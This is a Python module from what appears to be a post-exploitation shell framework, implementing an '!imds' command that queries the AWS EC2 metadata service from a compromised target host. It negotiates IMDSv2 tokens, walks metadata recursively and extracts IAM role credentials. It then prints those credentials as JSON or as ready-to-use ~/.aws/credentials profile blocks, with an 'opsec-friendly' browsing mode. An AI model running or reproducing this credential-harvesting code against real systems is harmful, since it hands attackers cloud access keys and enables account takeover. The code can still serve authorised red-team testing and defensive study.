# toboggan/core/actions/imds/common.py

"""OS-agnostic AWS EC2 instance metadata service (IMDS) logic.

The Linux ``!imds`` action only implements ``_prepare()`` and ``_request()``,
which send one HTTP request from the target and return an ``ImdsResponse``.
Everything else (argument parsing, path rules, IMDSv2 negotiation, recursive
walks, credential extraction) lives here so it can be tested without a target.
"""

# Built-in imports
import asyncio
import json
import re
import sys
from abc import abstractmethod
from collections.abc import Callable, Iterator
from dataclasses import dataclass

# External library imports
from loguru import logger

# Local application/library specific imports
from toboggan.core.action import BaseAction
from toboggan.core.utils.navigator import LoaderError, browse_tree

# https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/instancedata-data-retrieval.html
IMDS_ENDPOINT = "http://169.254.169.254"
TOKEN_PATH = "api/token"
TOKEN_TTL_HEADER = "X-aws-ec2-metadata-token-ttl-seconds"
TOKEN_HEADER = "X-aws-ec2-metadata-token"
TOKEN_TTL_SECONDS = 21600
META_DATA_ROOT = "meta-data/"
CREDENTIALS_PATH = "meta-data/iam/security-credentials/"
IAM_INFO_PATH = "meta-data/iam/info"

CONNECT_TIMEOUT = 2  # seconds; a non-EC2 target should fail fast
REQUEST_TIMEOUT = 5  # seconds for a whole request on the target
EXECUTION_TIMEOUT = 15  # seconds for the remote command carrying the request

MAX_RECURSION_DEPTH = 8
MAX_RECURSION_ENTRIES = 200  # requests (listings + values) per recursive walk

STATUS_MARKER = "TBG_IMDS_STATUS:"

# IMDS keys (including instance tag keys) only use these characters. Anything
# else is rejected before it reaches a target command.
_SAFE_PATH = re.compile(r"[A-Za-z0-9._,:+=@/-]*")
_SAFE_TOKEN = re.compile(r"[A-Za-z0-9_=+/.-]{1,512}")
_SAFE_PROFILE = re.compile(r"[A-Za-z0-9._-]{1,64}")
_TOP_LEVEL_DIRECTORIES = ("meta-data", "dynamic")

USAGE = "!imds [-v1|-v2] [-r] [PATH]  |  !imds --creds [-v1|-v2] [--profile NAME]"


@dataclass(frozen=True)
class ImdsResponse:
    """One IMDS HTTP exchange performed on the target.

    ``status`` is the HTTP status code, ``0`` for an HTTP error whose code the
    client could not report, or ``None`` when no HTTP response was received.
    """

    status: int | None
    body: str = ""
    error: str = ""

    @property
    def ok(self) -> bool:
        """Return whether the IMDS response indicates success."""
        return self.status == 200


@dataclass(frozen=True)
class Entry:
    """One child entry in an IMDS directory listing."""

    label: str
    path: str
    is_dir: bool


@dataclass(frozen=True)
class ImdsOptions:
    """Parsed options for an ``!imds`` invocation."""

    version: str | None = None
    path: str | None = None
    recursive: bool = False
    creds: bool = False
    profile: bool = False
    profile_name: str | None = None


def parse_options(
    args: tuple[str, ...] | list[str],
    recursive: object = False,
    creds: object = False,
    profile: object = False,
) -> ImdsOptions:
    """Parse ``!imds`` arguments as delivered by the terminal.

    The terminal passes single-dash tokens as positionals and turns
    ``--flag value`` into ``flag="value"``; a string flag value is therefore
    a swallowed token and is parsed like a positional. ``--profile`` is a bare
    flag (the profile name is the IAM role name from IMDS) but also accepts an
    explicit override name; either form implies ``--creds``.
    """
    tokens = list(args)
    for value in (recursive, creds):
        if isinstance(value, str):
            tokens.append(value)
    recursive, creds = bool(recursive), bool(creds)
    profile_flag, profile_name = bool(profile), None
    if isinstance(profile, str) and profile:
        if not _SAFE_PROFILE.fullmatch(profile):
            raise ValueError(f"Invalid profile name: {profile!r}")
        profile_flag, profile_name = True, profile
    if profile_flag:
        creds = True
    version = None
    path = None
    for token in tokens:
        flag = token.lower()
        if flag in ("-v1", "-v2"):
            if version and version != flag[1:]:
                raise ValueError("-v1 and -v2 are mutually exclusive.")
            version = flag[1:]
        elif flag in ("-r", "--recursive"):
            recursive = True
        elif flag == "--creds":
            creds = True
        elif token.startswith("-"):
            raise ValueError(f"Unknown option: {token}")
        elif path is not None:
            raise ValueError("Only one PATH can be given.")
        else:
            path = token
    if creds and (recursive or path is not None):
        raise ValueError("--creds takes no PATH and cannot be combined with -r.")
    return ImdsOptions(version, path, recursive, creds, profile_flag, profile_name)


def is_safe_path(path: str) -> bool:
    """Return whether ``path`` contains only safe IMDS characters and no traversal."""
    return bool(_SAFE_PATH.fullmatch(path)) and not any(segment in (".", "..") for segment in path.split("/"))


def resolve_path(path: str | None) -> str:
    """Map an operator PATH to a path relative to ``/latest/``.

    PATH is relative to ``/latest/meta-data/``; a PATH starting with
    ``/latest/`` is used as-is (for ``user-data`` and ``dynamic/``).
    """
    if not path:
        return META_DATA_ROOT
    if path.startswith("/latest/") or path == "/latest":
        resolved = path[len("/latest/") :]
    elif path.startswith("/"):
        raise ValueError("Absolute paths must start with /latest/ (e.g. /latest/user-data).")
    else:
        resolved = META_DATA_ROOT + path
    if not is_safe_path(resolved):
        raise ValueError(f"Unsafe IMDS path rejected: {path!r}")
    return resolved


def imds_url(path: str) -> str:
    """Build the full IMDS URL for a path relative to ``/latest/``."""
    return f"{IMDS_ENDPOINT}/latest/{path}"


def split_marker(raw: str, marker: str) -> tuple[str, str] | None:
    r"""Split ``<body>\\n<marker><digits>`` (the request command output)."""
    match = re.fullmatch(rf"(.*?)\n?{re.escape(marker)}(\d+)\s*", raw, re.DOTALL)
    return (match.group(1), match.group(2)) if match else None


def child_entries(parent: str, body: str) -> tuple[list[Entry], int]:
    """Parse an IMDS directory listing; return entries and unsafe-skipped count."""
    base = parent if not parent or parent.endswith("/") else parent + "/"
    entries, skipped = [], 0
    for line in body.splitlines():
        name = line.strip()
        if not name:
            continue
        # public-keys/ lists "0=key-name" but is browsed as public-keys/0/.
        if match := re.fullmatch(r"(\d+)=.*", name):
            relative, is_dir = match.group(1) + "/", True
        elif name.endswith("/"):
            relative, is_dir = name, True
        elif not base and name in _TOP_LEVEL_DIRECTORIES:
            relative, is_dir = name + "/", True
        else:
            relative, is_dir = name, False
        path = base + relative
        if not is_safe_path(path) or relative.startswith("/"):
            skipped += 1
            continue
        entries.append(Entry(name, path, is_dir))
    return entries, skipped


def describe_failure(response: ImdsResponse, path: str) -> str:
    """Return a human-readable explanation of a failed IMDS response."""
    if response.status is None:
        return response.error or "IMDS unreachable from the target."
    if response.status == 401:
        return "HTTP 401: IMDSv2 session token required or rejected (try -v2)."
    if response.status == 403:
        return "HTTP 403: IMDS access forbidden (disabled or blocked?)."
    if response.status == 404:
        return f"Not found: /latest/{path}"
    if response.status == 0:
        detail = f" ({response.error})" if response.error else ""
        return f"HTTP error; the client did not report the status code{detail}."
    return f"HTTP {response.status} for /latest/{path}"


def format_value(path: str, value: str) -> str:
    """Format a leaf IMDS value as ``path: value``, indenting multiline values."""
    value = value.rstrip("\n")
    if "\n" not in value:
        return f"{path}: {value}"
    return f"{path}:\n" + "\n".join(f"    {line}" for line in value.splitlines())


def walk(
    get: Callable[[str], ImdsResponse],
    start: str,
    max_depth: int = MAX_RECURSION_DEPTH,
    max_entries: int = MAX_RECURSION_ENTRIES,
) -> Iterator[tuple[str, str, str]]:
    """Depth-first walk yielding ``(kind, path, text)`` events.

    ``kind`` is ``dir`` for a listed directory, ``value`` for a leaf,
    ``error`` for a failed request, or ``limit`` when a cap stopped the walk.
    """
    if start and not start.endswith("/"):
        start += "/"
    stack = [(start, 0, True)]
    requests = 0
    while stack:
        path, depth, is_dir = stack.pop()
        if requests >= max_entries:
            yield ("limit", path, f"entry limit ({max_entries} requests) reached; output truncated.")
            return
        response = get(path)
        requests += 1
        if not response.ok:
            yield ("error", path, describe_failure(response, path))
            continue
        if not is_dir:
            yield ("value", path, response.body)
            continue
        yield ("dir", path, "")
        entries, skipped = child_entries(path, response.body)
        if skipped:
            yield ("error", path, f"skipped {skipped} entries with unsafe names.")
        if depth >= max_depth:
            if entries:
                yield ("limit", path, f"depth limit ({max_depth}) reached; not descending.")
            continue
        for entry in reversed(entries):
            stack.append((entry.path, depth + 1, entry.is_dir))


def interactive_terminal() -> bool:
    """Whether a nested prompt_toolkit application can take over the terminal."""
    try:
        if not (sys.stdin.isatty() and sys.stdout.isatty()):
            return False
    except (AttributeError, ValueError):
        return False
    try:
        asyncio.get_running_loop()
    except RuntimeError:
        return True
    return False  # already inside an event loop; Application.run() would fail


class ImdsClient:
    """IMDS session over an OS-specific ``request(method, path, headers)``.

    The IMDSv2 token is kept for the lifetime of the client (one ``!imds``
    invocation, including a whole interactive session) and refreshed once if
    IMDS answers 401.
    """

    def __init__(
        self,
        request: Callable[[str, str, dict[str, str]], ImdsResponse],
        version: str | None = None,
    ):
        self._request = request
        self._requested = version
        self._token: str | None = None
        self.version: str | None = None

    def connect(self) -> bool:
        """Negotiate the IMDS version and acquire a session token if needed."""
        if self._requested == "v1":
            self.version = "v1"
            logger.info("Using IMDSv1 (no session token).")
            return True
        response = self._fetch_token()
        if response.ok:
            self.version = "v2"
            logger.info(f"Using IMDSv2 session token (TTL {TOKEN_TTL_SECONDS}s).")
            return True
        reason = describe_failure(response, TOKEN_PATH)
        if self._requested == "v2":
            logger.error(f"IMDSv2 token request failed: {reason}")
            return False
        self.version = "v1"
        logger.warning(f"IMDSv2 unavailable ({reason}); falling back to IMDSv1.")
        return True

    def _fetch_token(self) -> ImdsResponse:
        response = self._request("PUT", TOKEN_PATH, {TOKEN_TTL_HEADER: str(TOKEN_TTL_SECONDS)})
        if not response.ok:
            return response
        token = response.body.strip()
        if not _SAFE_TOKEN.fullmatch(token):
            return ImdsResponse(None, error="IMDSv2 token response was malformed.")
        self._token = token
        return response

    def _headers(self) -> dict[str, str]:
        return {TOKEN_HEADER: self._token} if self.version == "v2" else {}

    def get(self, path: str) -> ImdsResponse:
        """Fetch an IMDS path, refreshing the token on 401 if using IMDSv2."""
        response = self._request("GET", path, self._headers())
        if response.status == 401 and self.version == "v2" and self._fetch_token().ok:
            response = self._request("GET", path, self._headers())
        return response


class ImdsLoader:
    """Fetch one IMDS node at a time for the interactive navigator.

    ``browse_tree`` calls ``list``/``read`` only as the operator descends, so a
    browsing session sends one request per node opened and nothing else.
    """

    def __init__(self, client: ImdsClient):
        self._client = client

    def list(self, path: str) -> list[tuple[str, str, bool]]:
        """List the children of an IMDS directory node."""
        response = self._client.get(path)
        if not response.ok:
            raise LoaderError(describe_failure(response, path))
        entries, _ = child_entries(path, response.body)
        # child_entries keeps a listing's own trailing '/' in the label; drop it
        # so the navigator adds exactly one '/' to directory labels.
        return [(entry.label.rstrip("/"), entry.path, entry.is_dir) for entry in entries]

    def read(self, path: str) -> str:
        """Read the value of an IMDS leaf node."""
        response = self._client.get(path)
        if not response.ok:
            raise LoaderError(describe_failure(response, path))
        return response.body.rstrip("\n")


class ImdsBase(BaseAction):
    """Shared ``!imds`` behaviour; subclasses send the HTTP requests."""

    DESCRIPTION = "Browse the AWS EC2 instance metadata service (IMDSv1/v2) from the target."

    def run(
        self,
        *args: str,
        recursive: bool = False,
        creds: bool = False,
        profile: object = False,
    ) -> None:
        """Browse the AWS EC2 instance metadata service from the target.

        Usage: !imds [-v1|-v2] [-r] [PATH]  |  !imds --creds [-v1|-v2] [--profile]
        -v1 / -v2   Force IMDSv1 or IMDSv2 (mutually exclusive). Default: try
                    IMDSv2 and fall back to IMDSv1 with a warning.
        PATH        Relative to /latest/meta-data/ (e.g. iam/info). A PATH starting
                    with /latest/ is used as-is (e.g. /latest/user-data,
                    /latest/dynamic/instance-identity/document).
                    Listings end sub-directories with '/'.
        -r          Recursively print 'path: value' for every leaf below PATH
                    (capped at 8 levels and 200 requests).
        --creds     Print each IAM role's credentials as formatted JSON.
        --profile   With --creds, print an ~/.aws/credentials profile block named
                    after the IAM role instead of JSON (add a name to override).
        No PATH and no -r on an interactive terminal opens a full-screen browser
        that fetches one node per keypress (opsec-friendly; nothing is dumped up
        front): up/down or j/k move, Enter opens a directory or value, left/
        Backspace goes back, q/Esc quits. Without a TTY the root listing is
        printed instead. No remote files are created.
        """
        try:
            options = parse_options(args, recursive, creds, profile)
            path = resolve_path(options.path)
        except ValueError as exc:
            logger.error(str(exc))
            logger.info(f"Usage: {USAGE}")
            return None

        if not self._prepare():
            return None
        client = ImdsClient(self._request, options.version)
        if not client.connect():
            return None

        if options.creds:
            self._show_credentials(client, options.profile, options.profile_name)
        elif options.recursive:
            self._walk(client, path)
        elif options.path is None and interactive_terminal():
            self._browse(client, path)
        else:
            self._show(client, path)
        return None

    @abstractmethod
    def _prepare(self) -> bool:
        """Check the target can send HTTP requests; log why not otherwise."""

    @abstractmethod
    def _request(self, method: str, path: str, headers: dict[str, str]) -> ImdsResponse:
        """Send one request to ``imds_url(path)`` from the target."""

    def _show(self, client: ImdsClient, path: str) -> None:
        response = client.get(path)
        if not response.ok:
            logger.error(describe_failure(response, path))
            return
        if path.endswith("/"):
            logger.info(f"/latest/{path} (entries ending in '/' are directories)")
        print(response.body.rstrip("\n"))

    def _walk(self, client: ImdsClient, path: str) -> None:
        logger.info(f"Recursive walk of /latest/{path}")
        leaves = 0
        for kind, item, text in walk(client.get, path):
            if kind == "value":
                leaves += 1
                print(format_value(item, text))
            elif kind in ("error", "limit"):
                logger.warning(f"{item}: {text}")
        logger.info(f"{leaves} values retrieved.")

    def _browse(self, client: ImdsClient, path: str) -> None:
        """Open the interactive browser; it fetches one node per keypress."""
        loader = ImdsLoader(client)
        try:
            root_entries = loader.list(path)
        except LoaderError as exc:
            logger.error(str(exc))
            return
        if not root_entries:
            logger.warning(f"/latest/{path} has no entries to browse.")
            return
        logger.info("Opening IMDS browser; each step fetches only the node you open (q or Esc to quit).")
        # The browser runs a full-screen app and fetches through the target
        # while open; silence host logging so remote-exec output cannot corrupt
        # the screen. Fetch failures are shown inside the browser instead.
        logger.disable("toboggan")
        try:
            browse_tree(path, loader, root_entries, title=f"IMDS{client.version} /latest/")
        finally:
            logger.enable("toboggan")
        logger.info("Closed IMDS browser.")

    def _show_credentials(self, client: ImdsClient, profile: bool = False, profile_name: str | None = None) -> None:
        listing = client.get(CREDENTIALS_PATH)
        if listing.status == 404 or (listing.ok and not listing.body.strip()):
            logger.warning("No IAM role attached to this instance.")
            return
        if not listing.ok:
            logger.error(f"Cannot list IAM roles: {describe_failure(listing, CREDENTIALS_PATH)}")
            return

        info = client.get(IAM_INFO_PATH)
        if info.ok:
            try:
                arn = json.loads(info.body).get("InstanceProfileArn")
            except (ValueError, AttributeError):
                arn = None
            if arn:
                logger.info(f"Instance profile: {arn}")

        entries, skipped = child_entries(CREDENTIALS_PATH, listing.body)
        if skipped:
            logger.warning(f"Skipped {skipped} role names with unsafe characters.")
        usable: list[tuple[str, dict]] = []
        for entry in entries:
            role = entry.label.rstrip("/")
            role_path = entry.path.rstrip("/")
            response = client.get(role_path)
            if not response.ok:
                logger.error(f"Role {role}: {describe_failure(response, role_path)}")
                continue
            try:
                credentials = json.loads(response.body)
                if not isinstance(credentials, dict):
                    raise ValueError("not a JSON object")
            except ValueError as exc:
                logger.error(f"Role {role}: unexpected credentials document ({exc}).")
                continue
            if credentials.get("Code", "Success") != "Success":
                logger.warning(f"Role {role}: IMDS reported Code {credentials['Code']}.")
            elif "AccessKeyId" in credentials:
                logger.success(
                    f"Credentials found for role {role} (expires {credentials.get('Expiration', 'unknown')})."
                )
                usable.append((role, credentials))
            if not profile:
                print(json.dumps(credentials, indent=2))

        if profile:
            self._print_profiles(usable, profile_name)

    @staticmethod
    def _print_profiles(usable: list[tuple[str, dict]], profile_name: str | None) -> None:
        """Print each role's credentials as an ~/.aws/credentials profile block."""
        if not usable:
            logger.warning("No usable credentials to render as a profile.")
            return
        for index, (role, credentials) in enumerate(usable):
            if profile_name is None:
                name = role  # the profile name is guessed from the IAM role
            else:
                name = profile_name if index == 0 else f"{profile_name}-{role}"
            lines = [
                f"[{name}]",
                f"aws_access_key_id = {credentials.get('AccessKeyId', '')}",
                f"aws_secret_access_key = {credentials.get('SecretAccessKey', '')}",
            ]
            if credentials.get("Token"):
                lines.append(f"aws_session_token = {credentials['Token']}")
            print("\n".join(lines))
            print()
